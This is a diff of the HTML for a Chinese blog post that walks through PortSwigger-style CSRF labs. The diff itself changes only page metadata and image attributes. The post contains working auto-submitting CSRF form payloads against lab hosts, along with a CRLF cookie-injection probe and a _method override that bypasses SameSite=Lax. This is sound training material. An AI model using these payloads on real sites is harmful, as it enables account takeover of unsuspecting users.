@@ -7,99 +7,10 @@
   <meta http-equiv="expires" content="0">
   
   <title>CSRF基础 | Qexzi&#39;s Blog</title>
+  <link rel="canonical" href="https://Qexzi.github.io/2026/08/12/CSRF基础/">
   <meta name="author" content="Qexzi">
   
-  <meta name="description" content="前言
-
-在下面的题解中，没有特别强调时：SameSite:None
-漏洞完成最终利用形式：钓鱼，在实际利用中最好找到一个方法将钓鱼形式csrf转化为无用户交互的csrf，进而提高危害
-
-
-
-0x00.基础知识
-什么是CSRF？ 跨站请求伪造（Cross-Site Request Forgery，简称 CSRF），是一种利用用户已登录的身份，在用户不知情的情况下，诱导其在第三方页面发起伪造请求，从而执行非预期操作（如改密码、转账、修改信息）的漏洞。即攻击者不偷你的账号密码，不读你的 Cookie，只是让你的浏览器 “带着你的身份，替你干坏事”。
-
-漏洞由来：HTTP 无状态与 Cookie 的设计初衷
-
-HTTP 协议本身是无状态的：每次请求都是独立的，网站无法直接识别用户身份。
-为了实现 “免重复登录”，诞生了Cookie + Session机制：用户登录后，网站会在浏览器中写入 Cookie，后续每次访问该网站，浏览器都会自动带上对应域名的 Cookie，网站通过 Cookie 识别用户身份。
-漏洞的根源：浏览器的 “自动带 Cookie” 机制，被跨站请求滥用 —— 第三方恶意页面发起的请求，浏览器依然会自动带上目标网站的 Cookie，网站无法区分请求是用户主动发起，还是被伪造的。
-
-
-CSRF 攻击的 3 个必备条件
-
-用户处于目标网站的有效登录状态（浏览器存有合法的会话 Cookie）；
-目标网站的敏感操作接口，仅依赖 Cookie 做身份校验，没有额外的请求合法性校验；
-浏览器允许跨站发起请求，并自动携带目标网站的 Cookie（这是浏览器的原生行为）。
-
-
-
-对于cookie的字段认识Cookie 所有标准字段完整对照表
-
-
-
-字段名称
-示例值
-详细作用
-
-
-
-Name&amp;#x3D;Value
-user_session=7s9k2p6d8f1g
-Cookie 核心主体，以键值对形式存储用户会话、身份标识、临时配置等数据，是网站识别用户的核心凭证。
-
-
-Domain
-example.com
-规定该 Cookie 归属的域名，默认是当前请求域名；设置后所有子域名都能携带、访问该 Cookie。
-
-
-Path
-/admin
-限制 Cookie 生效的网站路径，只有访问域名下该路径及子路径时，浏览器才会携带此 Cookie。
-
-
-Expires
-Fri, 31 Dec 2026 23:59:59 GMT
-绝对过期时间，设置固定日期时间；到达时间后浏览器自动删除该 Cookie，用于持久型 Cookie。
-
-
-Max-Age
-86400
-相对过期时间，单位秒；从设置时刻开始倒计时，超时自动删除，优先级高于 Expires。
-
-
-HttpOnly
-无值（仅标记）
-禁止前端 JavaScript 通过 document.cookie 读取和操作该 Cookie，防止 XSS 攻击窃取会话凭证。
-
-
-Secure
-无值（仅标记）
-该 Cookie 仅在 HTTPS 加密请求中携带，HTTP 明文请求不会发送，避免中间人抓包窃取。
-
-
-SameSite
-Strict &amp;#x2F; Lax &amp;#x2F; None
-管控跨站请求时是否自动携带 Cookie，用来规范浏览器跨域身份凭证的发送行为。
-
-
-Priority
-High &amp;#x2F; Medium &amp;#x2F; Low
-浏览器存储空间不足时，按优先级淘汰 Cookie；高优先级最后被清理，保证重要会话 Cookie 留存。
-
-
-Partitioned
-无值（仅标记）
-隔离第三方 Cookie，采用分区存储，防止跨网站追踪用户行为，适配现代浏览器隐私策略。
-
-
-
-SameSite&amp;#x3D;Strict（比如 hook_slardar_session_id）：浏览器完全禁止跨站请求携带这个 Cookie。也就是说，只要请求是从其他域名发起的（比如恶意页面），浏览器绝不会带上这个 Cookie，直接防御 CSRF。
-SameSite&amp;#x3D;None（比如 passport_csrf_token、ssid_ucp_v1）：浏览器不限制跨站携带，任何跨站请求（POST 表单、AJAX、GET 跳转）都会自动带上 Cookie。这是 CSRF 风险最高的设置，而且必须搭配 Secure 属性（截图里这些 Cookie 都同时开了 Secure，符合规范）。
-无显式设置（默认 Lax）（截图里大部分 Cookie 没标 SameSite，Chrome 80+ 默认值）：宽松限制：仅在「跨站顶级导航的 GET 请求」中携带 Cookie（比如点击恶意链接跳转到目标网站），跨站 POST 表单、AJAX 请求不会携带。这意味着：如果靶场的敏感操作是 GET 请求，Lax Cookie 依然能被 CSRF 利用；如果是 POST 请求，跨站表单就带不上 Cookie，攻击会失败。
-
-在现在的网页中，网站会在用户会话中生成一个随机 Token，存在 Cookie 里，同时在表单 &amp;#x2F; 请求参数里也会带上这个 Token，提交请求时服务器会比对两者是否一致，直接防御 CSRF。"> 
+  <meta name="description" content="网络安全学习笔记：Web 渗透、内网攻防、CTF、PWN 与计算机基础知识">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -112,6 +23,8 @@ SameSite&amp;#x3D;None（比如 passport_csrf_token、ssid_ucp_v1）：浏览器
   
 
   
+    <link rel="alternative" href="/atom.xml" title="Qexzi&#39;s Blog" type="application/atom+xml">
+  
   
     <link href="/zhuzhuxia.png" rel="icon">
   
@@ -122,7 +35,6 @@ SameSite&amp;#x3D;None（比如 passport_csrf_token、ssid_ucp_v1）：浏览器
   <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
@@ -130,41 +42,18 @@ SameSite&amp;#x3D;None（比如 passport_csrf_token、ssid_ucp_v1）：浏览器
 
   <!-- analytics -->
   
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-70812759-1');
-</script>
 
 
 
 
+  
 
+  
+  <!-- 结构化数据：帮助搜索引擎理解文章元信息 -->
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CSRF基础","datePublished":"2026-08-12T04:00:00.000Z","dateModified":"2026-08-12T04:00:00.000Z","author":{"@type":"Person","name":"Qexzi"},"mainEntityOfPage":"https://Qexzi.github.io/2026/08/12/CSRF基础/","description":"前言 在下面的题解中，没有特别强调时：SameSite:None 漏洞完成最终利用形式：钓鱼，在实际利用中最好找到一个方法将钓鱼形式csrf转化为无用户交互的csrf，进而提高危害 0x00.基础知识 什么是CSRF？ 跨站请求伪造（Cross-Site Request Forgery，简称 CSRF），是一种利用用户已登录的身份，在用户不知情的情况下，诱导其在第三方页面发起伪造请求，从而执行非预"}</script>
+  
 
-<meta name="generator" content="Hexo 8.1.1"><script>
-MathJax = {
-  tex: {
-    inlineMath: [['$', '$'], ['\\(', '\\)']],
-    displayMath: [['$$', '$$'], ['\\[', '\\]']],
-    processEscapes: true,
-    processEnvironments: true
-  },
-  options: {
-    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-  },
-  startup: {
-    pageReady: () => {
-      return MathJax.startup.defaultPageReady();
-    }
-  }
-};
-</script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-</head>
+<meta name="generator" content="Hexo 8.1.1"></head>
 
  <body>  
   <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
@@ -326,19 +215,19 @@ MathJax = {
 <p>在现在的网页中，网站会在<code>用户会话</code>中生成一个随机 Token，存在 Cookie 里，同时在表单 &#x2F; 请求参数里也会带上这个 Token，提交请求时服务器会比对两者是否一致，直接防御 CSRF。</p>
 <hr>
 <h3 id="0x01-无任何防御措施的-CSRF-漏洞"><a href="#0x01-无任何防御措施的-CSRF-漏洞" class="headerlink" title="0x01.无任何防御措施的 CSRF 漏洞"></a>0x01.无任何防御措施的 CSRF 漏洞</h3><p>本实验的修改邮箱功能存在 CSRF 跨站请求伪造漏洞。<br>通关要求：编写一段 HTML 代码，通过 CSRF 攻击自动修改访问者的邮箱，并将这份 HTML 上传到你的漏洞利用服务器。<br>你可使用以下账号密码登录自己的测试账号：用户名：wiener密码：peter</p>
-<p><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_1.png" alt="在这里插入图片描述"></p>
-<p>网页中也没有crsf_token，cookie中的SameSite为none没有任何限制，明显存在csrf。抓取修改邮箱的数据包进行进一步的利用<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_2.png" alt="在这里插入图片描述"></p>
+<p><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_1.png" alt="CSRF基础·图1"></p>
+<p>网页中也没有crsf_token，cookie中的SameSite为none没有任何限制，明显存在csrf。抓取修改邮箱的数据包进行进一步的利用<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_2.png" alt="CSRF基础·图2"></p>
 <p>邮件生成CSRF的POC</p>
-<p><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_3.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_3.png" alt="CSRF基础·图3"></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a77003d042f7989818f66a700d700e8.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker<span class="symbol">&amp;#64;</span>hack<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); <span class="comment">// 自动提交</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>理清楚攻击逻辑：burpsuite提供的攻击服务器就是我的钓鱼页面，其获取cookie的过程是：用户在目标网站中保持正常的登录状态，在这基础上访问了我的钓鱼网站，导致其cookie被我获取。</p>
 <hr>
 <h3 id="0x02-令牌校验依赖请求方法的-CSRF-漏洞"><a href="#0x02-令牌校验依赖请求方法的-CSRF-漏洞" class="headerlink" title="0x02.令牌校验依赖请求方法的 CSRF 漏洞"></a>0x02.令牌校验依赖请求方法的 CSRF 漏洞</h3><p>本实验的修改邮箱功能存在 CSRF 跨站请求伪造漏洞。<br>网站做了 CSRF 防御，但防御机制只针对特定请求方式生效。<br>通关要求：在你的漏洞利用服务器上托管一个 HTML 页面，通过 CSRF 攻击篡改访问者的邮箱地址。<br>你可以使用以下账号密码登录测试账户：用户名：wiener密码：peter</p>
-<p>SameSite字段依然是none；存在csrf_token,但是不断刷新页面发现其值<code>没有发生变化</code>（这也是一个漏洞点，但是这不是这题的核心）<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_4.png" alt="在这里插入图片描述"></p>
+<p>SameSite字段依然是none；存在csrf_token,但是不断刷新页面发现其值<code>没有发生变化</code>（这也是一个漏洞点，但是这不是这题的核心）<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_4.png" alt="CSRF基础·图4"></p>
 <p>因为存在csrf_token，理论上是可以防御csrf的：应用程序<code>不再仅依赖 cookie </code>进行会话处理，并且请求包含攻击者无法确定其值的参数。</p>
 <p>然而，有多种方法可以攻破防御，这意味着应用程序仍然容易受到 CSRF 的攻击。其中比较抽象的是有些后端POST请求方法会检查csrf_token，GET方法就不会检查csrf_token。</p>
-<p>先改方法再生成csrf的payload<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_5.png" alt="在这里插入图片描述"></p>
+<p>先改方法再生成csrf的payload<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_5.png" alt="CSRF基础·图5"></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ad100560302bf4080ac5d8800800027.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test<span class="symbol">&amp;#64;</span>hacker<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;neY6iziGZfJgHezfaFR4QwHw2MaqAZvJ&quot;</span> /&gt;</span>  //实际上没有必要了</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>随后部署攻击服务器就行</p>
@@ -350,11 +239,11 @@ MathJax = {
 <hr>
 <h3 id="0x04-令牌未绑定用户会话的跨站请求伪造漏洞"><a href="#0x04-令牌未绑定用户会话的跨站请求伪造漏洞" class="headerlink" title="0x04.令牌未绑定用户会话的跨站请求伪造漏洞"></a>0x04.令牌未绑定用户会话的跨站请求伪造漏洞</h3><p>本实验的修改邮箱功能存在跨站请求伪造漏洞。网站虽然启用了令牌机制用来防范跨站请求伪造攻击，但令牌没有和用户登录会话进行绑定关联。<br>通关要求：在你的漏洞利用服务器上搭建一个网页，利用跨站请求伪造攻击，篡改访问者的邮箱地址。<br>你拥有两个网站测试账号，可用来辅助构造攻击代码，账号密码如下：<code>账号一</code>：用户名 wiener 密码 peter ；<code>账号二</code>：用户名 carlos 密码 montoya</p>
 <p><code>在这种漏洞下，我们可以实现的攻击目标是什么？</code> 使用wienner（攻击者的账号）的token来实现修改carlos（受害者账号）的邮箱</p>
-<p>wiener账号<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_6.png" alt="在这里插入图片描述"></p>
-<p>carlos账号<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_7.png" alt="在这里插入图片描述"></p>
+<p>wiener账号<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_6.png" alt="CSRF基础·图6"></p>
+<p>carlos账号<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_7.png" alt="CSRF基础·图7"></p>
 <p>有的应用系统虽然将CSRF Token与Cookie中某个参数值绑定了，但是并没有与session这个Cookie参数绑定，这样还是会导致CSRF Token与绑定的参数组合可以被任意用户用于请求。即<code>正常的逻辑</code>是token 必须和你的登录身份、会话绑定死</p>
-<p>查看wiener的csrf_token：<code>5vbygEzomD4Bs5DFmRGS8Fwa3lVOR4ZP</code> （我不断刷新页面，csrf_token的值也在不断改变）<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_8.png" alt="在这里插入图片描述"></p>
-<p>将carlos的csrf_token换为wiener的csrf_token，然后发包再重定向<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_9.png" alt="在这里插入图片描述"><br>可以成功修改。随后我直接抓取邮件修改请求包生成csrf的payload</p>
+<p>查看wiener的csrf_token：<code>5vbygEzomD4Bs5DFmRGS8Fwa3lVOR4ZP</code> （我不断刷新页面，csrf_token的值也在不断改变）<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_8.png" alt="CSRF基础·图8"></p>
+<p>将carlos的csrf_token换为wiener的csrf_token，然后发包再重定向<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_9.png" alt="CSRF基础·图9"><br>可以成功修改。随后我直接抓取邮件修改请求包生成csrf的payload</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0abb003903f1c05b8005174a00dd00e3.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack@hack.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这里填你刚复制的、新鲜没过期的csrf值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MjzUP8ca09sx8EaralDrDQzdqaOjBu5C&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
 
 <p>虽然payload是类似的，但是利用的逻辑不一样</p>
@@ -365,14 +254,14 @@ MathJax = {
 <p><strong><code>漏洞可利用性验证</code></strong>：修改 session 会直接登出，修改 csrfKey 仅令牌校验失败；跨账户交换 csrfKey 与对应 csrf 令牌，请求仍可正常执行，证明 csrfKey 可跨账户复用</p>
 <p><strong><code>攻击入口挖掘</code></strong>：站点搜索功能无 CSRF 保护，且搜索参数可触发 Set-Cookie 响应，能向受害者浏览器注入攻击者的 csrfKey，补齐攻击所需的 Cookie 条件</p>
 <p><strong><code>攻击链路设计</code></strong>：先通过搜索功能向受害者注入攻击者的 csrfKey，再提交匹配该 csrfKey 的 csrf 令牌，自动触发修改邮箱的 POST 请求，完成 CSRF 攻击</p>
-<p>抓取更新邮箱的数据包（成功重定向）<br><code>csrf=WPIyZtwz2jK2wxPD7GyxCx8Tdp8yhbsc</code><br><code>csrfKey=qIAZcXr7tnN05UuUjGbz7i1Ud9tgYoDO</code><br><code>session=5Kg6PbSuvUP3p5zem1Dv3A0VwgiDwoHN</code><br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_10.png" alt="在这里插入图片描述"></p>
-<p>修改csrf<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_11.png" alt="在这里插入图片描述"></p>
-<p>修改csrfKey<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_12.png" alt="在这里插入图片描述"><br>此时可以知道 <code>csrf</code> 与 <code>csrfKey</code> 是对应的</p>
-<p>修改<code>session</code>，结果直接登出<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_13.png" alt="在这里插入图片描述"></p>
-<p>新建无痕窗口登录carlos，并抓取其更新邮箱的数据包<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_14.png" alt="在这里插入图片描述"></p>
-<p>以及<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_15.png" alt="在这里插入图片描述"></p>
+<p>抓取更新邮箱的数据包（成功重定向）<br><code>csrf=WPIyZtwz2jK2wxPD7GyxCx8Tdp8yhbsc</code><br><code>csrfKey=qIAZcXr7tnN05UuUjGbz7i1Ud9tgYoDO</code><br><code>session=5Kg6PbSuvUP3p5zem1Dv3A0VwgiDwoHN</code><br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_10.png" alt="CSRF基础·图10"></p>
+<p>修改csrf<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_11.png" alt="CSRF基础·图11"></p>
+<p>修改csrfKey<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_12.png" alt="CSRF基础·图12"><br>此时可以知道 <code>csrf</code> 与 <code>csrfKey</code> 是对应的</p>
+<p>修改<code>session</code>，结果直接登出<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_13.png" alt="CSRF基础·图13"></p>
+<p>新建无痕窗口登录carlos，并抓取其更新邮箱的数据包<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_14.png" alt="CSRF基础·图14"></p>
+<p>以及<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_15.png" alt="CSRF基础·图15"></p>
 <p><code>csrf=2S8VVaZyVtZZLbelSYVRTkUT2HdWEXZ7</code><br><code>csrfKey=kEsnpYn4Z1HgJarQPt7RBqanCVqCUzKh</code><br><code>session=YxXV5Ix0rvwLO1UDrTUf9izOxrza15AN</code></p>
-<p>替换wiener更新邮箱的参数<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_16.png" alt="在这里插入图片描述"></p>
+<p>替换wiener更新邮箱的参数<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_16.png" alt="CSRF基础·图16"></p>
 <p>可以成功修改wiener的邮箱，到这里可以得到的信息：</p>
 <ol>
 <li>csrf 与 csrfKey 对应</li>
@@ -396,7 +285,7 @@ MathJax = {
 </li>
 </ol>
 </blockquote>
-<p>抓取搜索框数据报测试（&#x2F;?search&#x3D;test%0d%0aTest:123456），存在CRLF注入<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_17.png" alt="在这里插入图片描述"></p>
+<p>抓取搜索框数据报测试（&#x2F;?search&#x3D;test%0d%0aTest:123456），存在CRLF注入<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_17.png" alt="CSRF基础·图17"></p>
 <p>更新邮箱的 csrf payload</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a1c000903fa989183fc8f6f001100d3.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker<span class="symbol">&amp;#64;</span>hack<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;NIjwwCtTYJicvy5cUOQLhvfHYRjvgoWH&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -443,8 +332,8 @@ MathJax = {
 <li>None 完全不限制</li>
 </ul>
 <p><strong>SameSite 不是同源策略（SOP）的组成部分,它是浏览器另外单独设计的一套独立安全规则，和同源策略是平行、互补关系，不是包含关系</strong></p>
-<p>抓取修改邮箱的数据包：改邮箱接口 无 CSRF 随机令牌；<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_18.png" alt="在这里插入图片描述"></p>
-<p>查看cookie：浏览器默认使用 Lax 策略<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_19.png" alt="在这里插入图片描述"></p>
+<p>抓取修改邮箱的数据包：改邮箱接口 无 CSRF 随机令牌；<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_18.png" alt="CSRF基础·图18"></p>
+<p>查看cookie：浏览器默认使用 Lax 策略<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_19.png" alt="CSRF基础·图19"></p>
 <p><strong><code>SameSite=Lax 规则：跨站顶级页面跳转的 GET 请求 会自动携带会话 Cookie</code></strong></p>
 <ol>
 <li><p><strong><code>什么是「跨站」？</code></strong></p>
@@ -474,7 +363,7 @@ MathJax = {
 <li>✅ 只有 跨站 + 顶级导航 + GET 请求 → 会自动带 Cookie</li>
 <li>❌ 跨站 POST 请求（不管是表单、AJAX）→ 绝对不带 Cookie</li>
 </ul>
-<p>修改邮箱的数据包是post请求，尝试修改get请求：<code>失败</code><br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_20.png" alt="在这里插入图片描述"></p>
+<p>修改邮箱的数据包是post请求，尝试修改get请求：<code>失败</code><br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_20.png" alt="CSRF基础·图20"></p>
 <p>保留 GET 请求形式，同时让后端识别为 POST，因此尝试 _method 参数做请求方法伪装</p>
 <p><strong><code>_method 参数</code></strong></p>
 <blockquote>
@@ -490,15 +379,15 @@ MathJax = {
 </blockquote>
 </blockquote>
 </blockquote>
-<p>成功修改邮箱<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_21.png" alt="在这里插入图片描述"></p>
+<p>成功修改邮箱<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_21.png" alt="CSRF基础·图21"></p>
 <p>payload</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://0a3f0040036f9bb3808e2b76005b0054.web-security-academy.net/my-account/change-email?email=hacker@hack.com&amp;_method=POST&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>部署到攻击服务器即可</p>
 <hr>
